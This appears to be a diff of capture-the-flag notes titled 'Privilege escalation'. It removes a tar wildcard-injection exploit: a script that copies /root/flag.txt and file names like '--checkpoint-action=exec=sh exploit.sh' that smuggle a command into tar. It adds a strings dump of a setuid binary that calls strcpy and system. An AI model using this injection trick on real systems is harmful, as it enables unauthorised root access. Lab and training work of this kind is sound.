@@ -1,4 +1,86 @@
 Privilege escalation
-echo "cp /root/flag.txt ./flag_copy.txt && chmod 777 ./flag_copy.txt" > exploit.sh
-touch -- "--checkpoint=1"
-touch -- "--checkpoint-action=exec=sh exploit.sh"
+/lib64/ld-linux-x86-64.so.2
+libc.so.6
+setuid
+strcpy
+printf
+strlen
+system
+setgid
+strcmp
+__libc_start_main
+GLIBC_2.2.5
+__gmon_start__
+H=`@@
+11111111H
+[]A\A]A^A_
+Usage: %s <input>
+Buffer: %s
+%c: %d
+22222222
+/bin/bash
+:*3$"
+GCC: (Ubuntu 9.4.0-1ubuntu1~20.04.1) 9.4.0
+crtstuff.c
+deregister_tm_clones
+__do_global_dtors_aux
+completed.8061
+__do_global_dtors_aux_fini_array_entry
+frame_dummy
+__frame_dummy_init_array_entry
+main.c
+__FRAME_END__
+__init_array_end
+_DYNAMIC
+__init_array_start
+__GNU_EH_FRAME_HDR
+_GLOBAL_OFFSET_TABLE_
+__libc_csu_fini
+strcpy@@GLIBC_2.2.5
+_edata
+strlen@@GLIBC_2.2.5
+system@@GLIBC_2.2.5
+printf@@GLIBC_2.2.5
+__libc_start_main@@GLIBC_2.2.5
+__data_start
+strcmp@@GLIBC_2.2.5
+__gmon_start__
+__dso_handle
+_IO_stdin_used
+__libc_csu_init
+_dl_relocate_static_pie
+__bss_start
+main
+setgid@@GLIBC_2.2.5
+__TMC_END__
+setuid@@GLIBC_2.2.5
+.symtab
+.strtab
+.shstrtab
+.interp
+.note.gnu.property
+.note.gnu.build-id
+.note.ABI-tag
+.gnu.hash
+.dynsym
+.dynstr
+.gnu.version
+.gnu.version_r
+.rela.dyn
+.rela.plt
+.init
+.plt.sec
+.text
+.fini
+.rodata
+.eh_frame_hdr
+.eh_frame
+.init_array
+.fini_array
+.dynamic
+.got
+.got.plt
+.data
+.bss
+.comment
+
